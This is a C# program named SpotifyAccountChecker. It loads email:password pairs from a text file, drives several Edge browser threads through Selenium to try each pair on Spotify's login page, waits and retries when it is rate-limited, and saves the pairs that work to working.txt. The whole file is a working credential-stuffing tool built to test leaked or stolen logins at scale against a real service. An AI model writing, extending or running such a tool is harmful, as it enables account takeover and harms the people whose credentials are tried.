using System;
using System.IO;
using System.Collections.Concurrent;
using System.Threading;
using OpenQA.Selenium;
using OpenQA.Selenium.Edge;

namespace SpotifyAccountChecker
{
    class Program
    {
        private static ConcurrentQueue<string> accountQueue = new ConcurrentQueue<string>();
        private static object locker = new object();

        static void Main(string[] args)
        {
            var accounts = File.ReadAllLines("account.txt");
            foreach (var account in accounts)
            {
                accountQueue.Enqueue(account);
            }

            int threadCount = 5;
            var threads = new Thread[threadCount];
            for (int i = 0; i < threadCount; i++)
            {
                threads[i] = new Thread(CheckAccount);
                threads[i].Start();
            }

            for (int i = 0; i < threadCount; i++)
            {
                threads[i].Join();
            }
        }

        static void CheckAccount()
        {
            var driverService = EdgeDriverService.CreateDefaultService();
            IWebDriver driver = new EdgeDriver(driverService);

            while (accountQueue.TryDequeue(out string account))
            {
                var credentials = account.Split(':');
                if (credentials.Length != 2)
                {
                    Console.WriteLine($"Invalid format for account: {account}");
                    continue;
                }

                var email = credentials[0];
                var password = credentials[1];

                int retryCount = 3;
                int delayInSeconds = 10;
                bool shouldRetry = false;
                bool isValid = false;

                do
                {
                    try
                    {
                        driver.Navigate().GoToUrl("https://accounts.spotify.com/en/login?continue=https%3A%2F%2Fopen.spotify.com%2Falbum%2F0mf62Euckc1IjJ7iW9UtzO%3Fflow_id%3D5726e779-6a85-4be5-9f75-05c212149648%253A1680860807");

                        var emailElement = driver.FindElement(By.Id("login-username"));
                        emailElement.Clear();
                        emailElement.SendKeys(email);

                        var passwordElement = driver.FindElement(By.Id("login-password"));
                        passwordElement.Clear();
                        passwordElement.SendKeys(password);

                        driver.FindElement(By.Id("login-button")).Click();
                        System.Threading.Thread.Sleep(2000);

                        if (driver.PageSource.Contains("429 Too Many Requests"))
                        {
                            shouldRetry = true;
                            System.Threading.Thread.Sleep(delayInSeconds * 1000);
                            retryCount--;
                        }
                        else if (driver.Url == "https://accounts.spotify.com/en/login?continue=https%3A%2F%2Fopen.spotify.com%2Falbum%2F0mf62Euckc1IjJ7iW9UtzO%3Fflow_id%3D5726e779-6a85-4be5-9f75-05c212149648%253A1680860807")
                        {
                            Console.WriteLine($"Account {email}:{password} is invalid.");
                            shouldRetry = false;
                        }
                        else
                        {
                            lock (locker)
                            {
                                File.AppendAllText("working.txt", $"{email}:{password}\n");
                            }
                            isValid = true;
                            shouldRetry = false;
                        }
                    }
                    catch (Exception ex) when (!ex.Message.Contains("429 Too Many Requests"))
                    {
                        shouldRetry = false;
                    }
                } while (shouldRetry && retryCount > 0);

                if (isValid)
                {
                    driver.Quit();
                    driver = new EdgeDriver(driverService);
                }
            }

            driver.Quit();
        }
    }
}
